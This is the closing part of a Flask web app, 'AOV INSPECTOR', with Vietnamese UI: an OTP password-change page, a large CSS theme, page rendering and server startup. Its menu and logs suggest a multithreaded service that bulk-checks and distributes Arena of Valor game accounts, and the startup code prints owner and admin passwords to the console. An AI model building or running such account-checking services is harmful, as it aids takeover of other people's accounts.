            session.clear()
            return redirect(url_for("login_page"))
    otp_sent = session.get("otp_pending") == username
    content = f'''<div class="card">
        <a href="/profile" class="btn btn-secondary btn-sm" style="margin-bottom:14px;">← Quay lại</a>
        <h2 class="card-title">🔑 ĐỔI MẬT KHẨU CÁ NHÂN</h2>
    </div>
    <div class="card">
        <form method="POST">
            <input type="hidden" name="step" value="{"confirm" if otp_sent else "request"}">
            {"" if otp_sent else """
            <div class="form-group"><label class="form-label">Mật khẩu hiện tại</label>
                <input type="password" name="old_password" class="form-input" required></div>
            <div style="background:rgba(0,240,255,0.08); padding:10px; border-radius:10px; margin-bottom:10px; border:1px solid rgba(0,240,255,0.3);">
                <p style="font-size:0.82em; color:#00f0ff;">📱 Mã OTP sẽ được gửi vào <b>Tin nhắn riêng</b> (vào Chat → 🆘 Tin nhắn riêng)</p>
            </div>
            """}
            {"" if not otp_sent else f"""
            <div class="form-group"><label class="form-label">Mã OTP (6 số)</label>
                <input type="text" name="otp" class="form-input" required maxlength="6" pattern="[0-9]{{6}}" placeholder="123456"></div>
            <div class="form-group"><label class="form-label">Mật khẩu mới (>=4 ký tự)</label>
                <input type="password" name="new_password" class="form-input" required minlength="4"></div>
            <div style="background:rgba(0,240,255,0.08); padding:10px; border-radius:10px; margin-bottom:10px; border:1px solid rgba(0,240,255,0.3);">
                <p style="font-size:0.82em; color:#00f0ff;">💬 <b>Chưa nhận được mã?</b> Vào <a href="/chat/support:{username}" target="_blank" style="color:#00f0ff; font-weight:700;">tin nhắn riêng ↗</a> để xem mã OTP (mở tab mới, không mất form).</p>
            </div>
            <div style="background:rgba(255,184,0,0.08); padding:10px; border-radius:10px; margin-bottom:10px; border:1px solid rgba(255,184,0,0.3);">
                <p style="font-size:0.82em; color:#ffb800;">⏱️ Mã có hiệu lực 5 phút. Nếu hết hạn, bấm nút bên dưới để gửi lại.</p>
                <a href="/my/change?resend=1" class="btn btn-warning btn-sm" style="margin-top:8px;">📱 Gửi lại mã OTP</a>
            </div>
            """}
            <button type="submit" class="btn btn-block {"btn-success" if otp_sent else ""}">
                {"🔐 Xác nhận đổi" if otp_sent else "📱 Gửi mã OTP vào Tin nhắn"}
            </button>
        </form>
    </div>'''
    return render_page(content, active_tab="profile", user=user)

# ========== BASE CSS ==========
BASE_CSS = """<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap');
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
:root{--pink:#ff00e5;--cyan:#00f0ff;--purple:#a855f7;--green:#00ff88;--orange:#ffb800;--red:#ff2951;--gray:#8b8b9a;--bg:#05000e;--glass:rgba(255,255,255,0.04);--border:rgba(255,255,255,0.08);--text:#fff;--text-dim:#a0a0b8;--text-mute:#5a5a70;--text-warn:#ffb800;}
html,body{font-family:'Rajdhani',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 0% 0%,rgba(255,0,229,0.25),transparent 40%),radial-gradient(circle at 100% 100%,rgba(0,240,255,0.25),transparent 40%);z-index:-2;animation:bgPulse 15s ease-in-out infinite;}
@keyframes bgPulse{0%,100%{opacity:0.8;}50%{opacity:1;}}
body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,240,255,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,240,255,0.04) 1px,transparent 1px);background-size:40px 40px;z-index:-1;pointer-events:none;animation:gridMove 30s linear infinite;}
@keyframes gridMove{0%{transform:translate(0,0);}100%{transform:translate(40px,40px);}}
.container{max-width:720px;margin:0 auto;padding:14px;position:relative;z-index:1;padding-bottom:40px;}
.app-header{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:linear-gradient(135deg,rgba(20,0,43,0.85),rgba(30,0,60,0.85));backdrop-filter:blur(24px);border:1px solid rgba(255,0,229,0.25);border-radius:20px;margin-bottom:14px;position:sticky;top:10px;z-index:100;box-shadow:0 8px 40px rgba(255,0,229,0.15);}
.app-logo{display:flex;align-items:center;gap:10px;}
.app-logo-icon{width:42px;height:42px;border-radius:13px;background:linear-gradient(135deg,#ff00e5,#a855f7,#00f0ff);display:flex;align-items:center;justify-content:center;font-size:1.3em;box-shadow:0 0 20px rgba(255,0,229,0.6);}
.app-logo-text{font-family:'Orbitron',sans-serif;font-size:1.1em;font-weight:900;letter-spacing:2.5px;background:linear-gradient(90deg,#ff00e5,#00f0ff,#a855f7);background-size:200% 100%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
.balance-pill{display:flex;align-items:center;gap:6px;padding:8px 14px;background:linear-gradient(135deg,rgba(255,0,229,0.2),rgba(168,85,247,0.2));border:1px solid rgba(255,0,229,0.5);border-radius:30px;font-weight:800;font-size:0.9em;color:#ff88ee;font-family:'Orbitron',sans-serif;}
.icon-btn{width:38px;height:38px;display:flex;align-items:center;justify-content:center;background:var(--glass);border:1px solid var(--border);border-radius:12px;color:var(--text-dim);text-decoration:none;font-size:1.1em;transition:all 0.3s;}
.card{background:linear-gradient(135deg,rgba(20,0,43,0.7),rgba(15,0,30,0.7));backdrop-filter:blur(24px);border:1px solid var(--border);border-radius:20px;padding:20px;margin-bottom:14px;position:relative;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,0.4);}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--pink),var(--cyan),transparent);opacity:0.8;}
.card-title{font-family:'Orbitron',sans-serif;font-size:1.1em;font-weight:800;letter-spacing:2px;margin-bottom:16px;display:flex;align-items:center;gap:10px;color:#fff;text-transform:uppercase;}
.menu-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;}
.menu-btn{text-decoration:none;background:linear-gradient(135deg,rgba(255,255,255,0.03),rgba(255,0,229,0.02));border:1px solid var(--border);border-radius:14px;padding:12px 6px;text-align:center;color:var(--text);display:flex;flex-direction:column;align-items:center;position:relative;transition:all 0.4s;}
.menu-btn:hover,.menu-btn.active{transform:translateY(-4px);border-color:var(--pink);box-shadow:0 12px 40px rgba(255,0,229,0.4);}
.menu-icon{font-size:1.5em;margin-bottom:4px;filter:drop-shadow(0 0 12px rgba(255,0,229,0.7));}
.menu-label{font-family:'Orbitron',sans-serif;font-size:0.55em;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--text-dim);}
.menu-btn.active .menu-label{color:#ff88ee;}
.menu-badge{position:absolute;top:6px;right:6px;background:linear-gradient(135deg,#ff00e5,#ff0066);color:#fff;font-size:0.55em;padding:2px 6px;border-radius:8px;font-weight:800;min-width:16px;}
.form-group{margin-bottom:16px;}
.form-label{display:block;font-size:0.75em;color:var(--text-dim);margin-bottom:8px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;font-family:'Orbitron',sans-serif;}
.form-input,.form-textarea{width:100%;padding:14px 16px;background:rgba(0,0,0,0.5);border:1.5px solid var(--border);border-radius:12px;color:var(--text);font-size:0.95em;font-family:inherit;transition:all 0.3s;outline:none;}
.form-input:focus,.form-textarea:focus{border-color:var(--pink);background:rgba(0,0,0,0.7);box-shadow:0 0 0 3px rgba(255,0,229,0.15);}
.form-textarea{min-height:100px;resize:vertical;font-family:'Share Tech Mono',monospace;}
.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:14px 24px;background:linear-gradient(135deg,#ff00e5,#a855f7);color:#fff;border:none;border-radius:12px;font-weight:800;font-size:0.9em;cursor:pointer;text-decoration:none;font-family:'Orbitron',sans-serif;letter-spacing:1.5px;text-transform:uppercase;transition:all 0.3s;box-shadow:0 6px 25px rgba(255,0,229,0.5);}
.btn:hover{transform:translateY(-3px);}
.btn-block{display:flex;width:100%;}
.btn-secondary{background:linear-gradient(135deg,rgba(255,255,255,0.08),rgba(255,255,255,0.04));border:1.5px solid var(--border);color:var(--text);box-shadow:none;}
.btn-success{background:linear-gradient(135deg,#00ff88,#00d4aa);box-shadow:0 6px 25px rgba(0,255,136,0.5);color:#000;}
.btn-warning{background:linear-gradient(135deg,#ffb800,#ff8800);color:#000;}
.btn-danger{background:linear-gradient(135deg,#ff2951,#d50000);}
.btn-info{background:linear-gradient(135deg,#00f0ff,#00a5ff);color:#000;}
.btn-sm{padding:8px 16px;font-size:0.72em;width:auto;}
.stat-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;}
.stat-grid-3{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;}
.stat-grid-4{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;}
.stat-grid-5{display:grid;grid-template-columns:repeat(5,1fr);gap:6px;}
.stat-box{background:linear-gradient(135deg,rgba(0,0,0,0.4),rgba(20,0,43,0.4));border:1px solid var(--border);border-radius:16px;padding:16px;text-align:center;transition:all 0.3s;}
.stat-value{font-family:'Orbitron',sans-serif;font-size:1.9em;font-weight:900;background:linear-gradient(135deg,#ff00e5,#00f0ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;line-height:1.1;margin-bottom:6px;}
.stat-label{font-size:0.65em;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;font-weight:700;font-family:'Orbitron',sans-serif;}
.stat-box.small{padding:10px 6px;}
.stat-box.small .stat-value{font-size:1.4em;margin-bottom:2px;}
.stat-box.small .stat-label{font-size:0.52em;}
.flash{padding:14px 16px;border-radius:12px;margin-bottom:12px;font-weight:600;font-size:0.9em;display:flex;align-items:center;gap:10px;}
.flash.error{background:rgba(255,0,60,0.15);border:1px solid rgba(255,0,60,0.5);color:#ff88aa;}
.flash.success{background:rgba(0,255,136,0.15);border:1px solid rgba(0,255,136,0.5);color:#88ffcc;}
.result-box{background:rgba(0,0,0,0.6);border:1px solid var(--border);border-radius:14px;padding:16px;font-family:'Share Tech Mono',monospace;font-size:0.78em;line-height:1.7;color:#c0c0e0;white-space:pre-wrap;word-break:break-word;max-height:500px;overflow-y:auto;}
.info-row{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid var(--border);font-size:0.9em;gap:8px;}
.info-row:last-child{border-bottom:none;}
.info-label{color:var(--text-dim);font-weight:600;font-size:0.9em;flex-shrink:0;}
.info-value{color:var(--text);font-weight:700;text-align:right;word-break:break-all;}
.list-item{background:linear-gradient(135deg,rgba(0,0,0,0.3),rgba(20,0,43,0.3));border:1px solid var(--border);border-radius:14px;padding:14px 16px;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between;gap:12px;text-decoration:none;color:var(--text);transition:all 0.3s;}
.list-item:hover{border-color:rgba(255,0,229,0.5);transform:translateX(5px);}
.tab-bar{display:flex;gap:8px;overflow-x:auto;margin-bottom:16px;padding-bottom:4px;scrollbar-width:none;}
.tab-bar::-webkit-scrollbar{display:none;}
.tab-item{flex-shrink:0;padding:10px 14px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:14px;color:var(--text-dim);text-decoration:none;font-weight:700;font-size:0.75em;white-space:nowrap;transition:all 0.3s;font-family:'Orbitron',sans-serif;letter-spacing:1px;}
.tab-item.active{background:linear-gradient(135deg,rgba(255,0,229,0.2),rgba(168,85,247,0.2));border-color:var(--pink);color:#ff88ee;}
.tab-item.sss-tab.active{background:linear-gradient(135deg,rgba(255,184,0,0.25),rgba(255,215,0,0.15));border-color:#ffb800;color:#ffd700;}
.tab-item.ss-tab.active{background:linear-gradient(135deg,rgba(0,240,255,0.25),rgba(0,229,255,0.15));border-color:#00f0ff;color:#00f0ff;}
.tab-item.anime-tab.active{background:linear-gradient(135deg,rgba(224,64,251,0.25),rgba(186,85,211,0.15));border-color:#e040fb;color:#e040fb;}
.tab-item.trang-tab.active{background:linear-gradient(135deg,rgba(139,139,154,0.25),rgba(90,90,112,0.15));border-color:#8b8b9a;color:#a0a0b8;}
.skin-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:10px;margin-top:8px;}
.skin-card{background:linear-gradient(135deg,rgba(0,0,0,0.5),rgba(20,0,43,0.5));border:1px solid var(--border);border-radius:12px;overflow:hidden;transition:all 0.3s;}
.skin-card:hover{transform:translateY(-3px);border-color:var(--pink);box-shadow:0 8px 25px rgba(255,0,229,0.3);}
.skin-img-wrap{width:100%;aspect-ratio:1;background:linear-gradient(135deg,#1a0033,#0a001a);display:flex;align-items:center;justify-content:center;overflow:hidden;}
.skin-img-wrap img{width:100%;height:100%;object-fit:cover;}
.skin-info{padding:8px;}
.skin-hero{font-family:'Orbitron',sans-serif;font-size:0.72em;font-weight:800;color:#ff88ee;margin-bottom:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.skin-name{font-size:0.66em;color:var(--text-dim);line-height:1.3;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;min-height:1.7em;}
.skin-id{font-size:0.6em;color:var(--text-mute);font-family:'Share Tech Mono',monospace;margin-top:2px;}
.cred-box{background:linear-gradient(135deg,rgba(0,240,255,0.08),rgba(255,0,229,0.08));border:1.5px solid rgba(0,240,255,0.4);border-radius:14px;padding:16px;margin-bottom:14px;}
.cred-label{font-family:'Orbitron',sans-serif;font-size:0.68em;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:6px;}
.cred-value{font-family:'Share Tech Mono',monospace;font-size:1em;color:#00f0ff;font-weight:700;word-break:break-all;padding:8px 12px;background:rgba(0,0,0,0.5);border-radius:8px;margin-bottom:12px;border:1px solid rgba(0,240,255,0.2);cursor:pointer;}
.cred-value:hover{background:rgba(0,240,255,0.1);}
.spinner{display:inline-block;width:22px;height:22px;border:3px solid rgba(255,0,229,0.2);border-top-color:var(--pink);border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:8px;}
@keyframes spin{to{transform:rotate(360deg);}}
.progress-container{background:rgba(0,0,0,0.4);border:1px solid var(--border);border-radius:16px;padding:20px;margin:16px 0;}
.progress-bar-wrap{width:100%;height:24px;background:rgba(0,0,0,0.6);border-radius:12px;overflow:hidden;position:relative;margin:12px 0;border:1px solid var(--border);}
.progress-bar-fill{height:100%;background:linear-gradient(90deg,#ff00e5,#a855f7,#00f0ff);border-radius:12px;transition:width 0.5s;}
.progress-text{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-family:'Orbitron',sans-serif;font-weight:800;font-size:0.78em;color:#fff;text-shadow:0 0 10px rgba(0,0,0,0.9);}
.live-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:14px;}
.live-stat{background:rgba(0,0,0,0.4);border:1px solid var(--border);border-radius:12px;padding:10px 8px;text-align:center;}
.live-stat .num{font-family:'Orbitron',sans-serif;font-size:1.4em;font-weight:900;line-height:1;}
.live-stat .lbl{font-size:0.6em;color:var(--text-dim);text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:4px;}
.live-log{background:rgba(0,0,0,0.7);border:1px solid var(--border);border-radius:12px;padding:12px;font-family:'Share Tech Mono',monospace;font-size:0.72em;line-height:1.6;max-height:400px;overflow-y:auto;margin-top:14px;}
.live-log .log-line.sss{color:#ffd700!important;font-weight:700;}
.live-log .log-line.ss{color:#00f0ff!important;}
.live-log .log-line.anime{color:#e040fb!important;}
.live-log .log-line.banned{color:#ff2951!important;}
.live-log .log-line.failed{color:#8b8b9a!important;}
.live-log .log-line.trang{color:#a0a0b8!important;}
.live-log .log-line.normal{color:#c0c0e0;}
.filter-badge{display:inline-block;padding:3px 10px;background:rgba(0,255,136,0.15);color:#00ff88;border:1px solid rgba(0,255,136,0.4);border-radius:8px;font-size:0.7em;font-weight:700;font-family:'Orbitron',sans-serif;}
.kho-badge{display:inline-block;padding:2px 8px;background:rgba(0,255,136,0.15);color:#00ff88;border:1px solid rgba(0,255,136,0.4);border-radius:8px;font-size:0.6em;font-weight:800;margin-left:6px;font-family:'Orbitron',sans-serif;}
.chat-box{background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:14px;padding:14px;height:400px;overflow-y:auto;display:flex;flex-direction:column;gap:10px;margin-bottom:12px;}
.chat-msg{max-width:80%;padding:10px 14px;border-radius:14px;word-wrap:break-word;}
.chat-msg.me{align-self:flex-end;background:linear-gradient(135deg,#ff00e5,#a855f7);color:#fff;border-bottom-right-radius:4px;}
.chat-msg.other{align-self:flex-start;background:rgba(255,255,255,0.06);border:1px solid var(--border);color:#fff;border-bottom-left-radius:4px;}
.chat-msg.system{align-self:center;background:linear-gradient(135deg,rgba(0,240,255,0.15),rgba(255,0,229,0.15));border:1.5px solid rgba(0,240,255,0.5);color:#00f0ff;font-family:'Share Tech Mono',monospace;font-size:0.85em;text-align:left;max-width:95%;}
.chat-meta{font-size:0.65em;opacity:0.7;margin-bottom:4px;font-family:'Orbitron',sans-serif;}
.chat-content{font-size:0.9em;line-height:1.4;white-space:pre-wrap;word-break:break-word;}
.chat-input-row{display:flex;gap:8px;align-items:center;}
.chat-input-row input{flex:1;}
.chat-unread{background:linear-gradient(135deg,#ff00e5,#ff0066);color:#fff;font-size:0.65em;font-weight:800;padding:3px 8px;border-radius:10px;min-width:20px;text-align:center;font-family:'Orbitron',sans-serif;}
::-webkit-scrollbar{width:6px;height:6px;}
::-webkit-scrollbar-thumb{background:linear-gradient(135deg,#ff00e5,#a855f7);border-radius:3px;}
@media (max-width:480px){.container{padding:12px;}.card{padding:16px;}.menu-grid{grid-template-columns:repeat(4,1fr);gap:6px;}.menu-icon{font-size:1.3em;}.menu-label{font-size:0.5em;}.skin-grid{grid-template-columns:repeat(2,1fr);}}
</style>
<script>
function showToast(msg){
    var t=document.createElement('div');
    t.style.cssText='position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:linear-gradient(135deg,#ff00e5,#a855f7);color:#fff;padding:14px 24px;border-radius:14px;font-weight:700;z-index:9999;box-shadow:0 10px 40px rgba(255,0,229,0.6);transition:transform 0.4s;font-family:Orbitron;';
    t.textContent=msg;document.body.appendChild(t);
    setTimeout(function(){t.style.transform='translateX(-50%) translateY(0)';},50);
    setTimeout(function(){t.style.transform='translateX(-50%) translateY(100px)';setTimeout(function(){t.remove();},400);},2500);
}
function copyText(el){
    if(navigator.clipboard){
        navigator.clipboard.writeText(el.textContent).then(function(){
            el.style.background='rgba(0,255,136,0.2)';showToast('✓ Đã copy!');
            setTimeout(function(){el.style.background='rgba(0,0,0,0.5)';},800);
        });
    }
}
</script>"""

def flash_html():
    msgs = get_flashed_messages(with_categories=True)
    if not msgs: return ""
    html = ""
    for cat, m in msgs:
        icon = "✕" if cat == "error" else "✓"
        html += f'<div class="flash {cat}"><span>{icon}</span><span>{m}</span></div>'
    return html

def render_page(content, active_tab="", user=None):
    unread = unread_count() if user else 0
    balance = user.get("balance", 0) if user else 0
    header = ""
    if user:
        admin_btn = ""
        if user.get("is_owner"):
            admin_btn = ('<a href="/owner" class="icon-btn" title="Owner">🥇</a>'
                         '<a href="/admin" class="icon-btn" title="Admin">👑</a>')
        elif user.get("is_qtv"):
            admin_btn = '<a href="/admin" class="icon-btn" title="QTV">👑</a>'
        header = f'''<div class="app-header">
            <div class="app-logo"><div class="app-logo-icon">◈</div><div class="app-logo-text">AOV</div></div>
            <div style="display:flex; gap:8px; align-items:center;">
                <div class="balance-pill">◈ {balance}</div>
                {admin_btn}
                <a href="/logout" class="icon-btn" title="Thoát">⎋</a>
            </div>
        </div>'''
    menu = ""
    if user:
        def mcls(tab): return "menu-btn active" if active_tab == tab else "menu-btn"
        notif_badge = f'<div class="menu-badge">{unread if unread < 10 else "9+"}</div>' if unread > 0 else ""
        is_own = is_owner(user["username"])
        is_q = is_qtv(user["username"])
        can_up = is_own or is_q
        menu = f'''<div class="card" style="padding:12px;">
            <div class="menu-grid">
                <a href="/check" class="{mcls('check')}"><div class="menu-icon">◈</div><div class="menu-label">Check</div></a>
                <a href="/nhan_acc" class="{mcls('nhan_acc')}"><div class="menu-icon">🎁</div><div class="menu-label">Nhận</div></a>
                <a href="/check_file" class="{mcls('check_file')}"><div class="menu-icon">▣</div><div class="menu-label">File</div></a>
                <a href="/loc_file" class="{mcls('loc_file')}"><div class="menu-icon">📥</div><div class="menu-label">Lọc</div></a>
                <a href="/export_tool" class="{mcls('export')}"><div class="menu-icon">📄</div><div class="menu-label">Tạo</div></a>
                <a href="/history" class="{mcls('history')}"><div class="menu-icon">▤</div><div class="menu-label">L.Sử</div></a>
                <a href="/chat" class="{mcls('chat')}"><div class="menu-icon">💬</div><div class="menu-label">Chat</div></a>
                <a href="/notifications" class="{mcls('notif')}"><div class="menu-icon">◉</div><div class="menu-label">T.Báo</div>{notif_badge}</a>
                <a href="/enter_code" class="{mcls('code')}"><div class="menu-icon">◆</div><div class="menu-label">Code</div></a>
                <a href="/profile" class="{mcls('profile')}"><div class="menu-icon">◐</div><div class="menu-label">C.Nhân</div></a>
                {('<a href="/up_acc" class="' + mcls('up_acc') + '"><div class="menu-icon">📤</div><div class="menu-label">UP ACC</div></a>') if can_up else ''}
                {('<a href="/kho_acc" class="' + mcls('kho_acc') + '"><div class="menu-icon">📦</div><div class="menu-label">Kho</div></a>') if can_up else ''}
            </div>
        </div>'''
    return f'''<!DOCTYPE html>
<html lang="vi"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="theme-color" content="#05000e"><title>AOV INSPECTOR v3.7.3</title>{BASE_CSS}</head>
<body><div class="container">{header}{menu}{flash_html()}{content}</div></body></html>'''

# ========== MAIN ==========
if __name__ == "__main__":
    load_data()
    create_admin()
    load_chat()
    threading.Thread(target=auto_backup_worker, daemon=True).start()
    threading.Thread(target=_save_daemon, daemon=True).start()

    import os as _os
    port = int(_os.environ.get("PORT", 5000))

    print("=" * 60)
    print("◈ AOV INSPECTOR - ULTIMATE EDITION v3.7.3 FINAL")
    print("=" * 60)
    print(f"🥇 OWNER : {OWNER_USERNAME} / {OWNER_PASSWORD}")
    for q in QTV_ACCOUNTS:
        print(f"👑 {q['username'].upper():6s}: {q['username']} / {q['password']}")
    print(f"📦 Kho: {len(ACC_STORAGE)} acc · Limit: {USER_DAILY_LIMIT} lượt/ngày")
    print(f"⚡ Up acc: {STORAGE_CHECK_THREADS} luồng · KHÔNG delay · KHÔNG nghỉ")
    print(f"🔧 v3.7.3: RETRY 3 LẦN + TIMEOUT 12s + FIX PLAYER_UID + BAN CHECK")
    print(f"⚠️  CẢNH BÁO LỖI TẠM THỜI khi thiếu data")
    print(f"🚀 Port: {port}")
    print("=" * 60)

    try:
        from waitress import serve
        print("⚡ Chạy với waitress")
        serve(app, host="0.0.0.0", port=port, threads=12,
              connection_limit=200, channel_timeout=60)
    except ImportError:
        print("⚠️ Chưa có waitress — dùng Flask dev")
        app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
